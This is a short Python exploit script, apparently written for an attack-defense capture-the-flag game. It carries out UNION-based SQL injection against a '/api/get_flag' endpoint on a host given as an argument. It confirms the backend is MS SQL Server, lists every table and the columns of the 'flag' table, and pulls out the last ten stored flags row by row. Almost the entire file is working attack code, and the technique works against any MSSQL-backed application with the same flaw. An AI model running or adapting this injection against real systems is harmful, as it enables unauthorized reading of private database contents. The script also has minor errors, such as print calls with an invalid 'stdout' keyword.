import requests
import sys


host = 'localhost'


def get(id):
    global host
    resp = requests.get(f'http://{host}/api/get_flag',
        params={
            'key': id,
        })
    jsono = resp.json()
    return jsono['Value']


def isSqlServer():
    try:
        return 'SQL Server' in get("""##!#' union all select @@version union all select '""")
    except:
        return False


def printAllTables():
    print('Tables')
    print('------')
    ind = 1
    while True:
        result = get(f"""##!#' union all (select [table_name] from (select [table_name], row_number() over (order by [table_name]) as rnum from information_schema.tables where table_type='BASE TABLE') as t where rnum = {ind}) union all select '""")
        if result == '':
            break
        print(f'{ind}: {result}')
        ind += 1
    print()


def printAllColumns(table_name):
    print(f'Columns in table {table_name}')
    print('---------------------')
    ind = 1
    while True:
        result = get(f"""##!#' union all (select [column_name] from (select [column_name], row_number() over (order by [column_name]) as rnum from information_schema.COLUMNS where TABLE_NAME = N'{table_name}') as t where rnum = {ind}) union all select '""")
        if result == '':
            break
        print(f'{ind}: {result}')
        ind += 1
    print()


def printLastFlags(count):
    res = []
    ind = 1
    while ind <= count:
        result = get(f"""##!#' union all (select [key] + ' ' + [value] from (select [key], [value], row_number() over (order by [id] desc) as rnum from [flag]) as t where rnum = {ind}) union all select '""")
        if result == '':
            break
        res.append(result)
        ind += 1
    res.reverse()
    print(f'Last {count} ids and flags')
    print('---------------------')
    for i in range(len(res)):
        flag = res[i]
        print(f'{i+1}: {flag}')


def main():
    if not isSqlServer():
        print("The backend does not use MS SQL Server =( Try other crackme's", stdout=sys.stderr)
        exit(1)
    printAllTables()
    printAllColumns('flag')
    printLastFlags(10)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Use <prog.py> host", stdout=sys.stderr)
        exit(1)
    host = sys.argv[1]
    main()
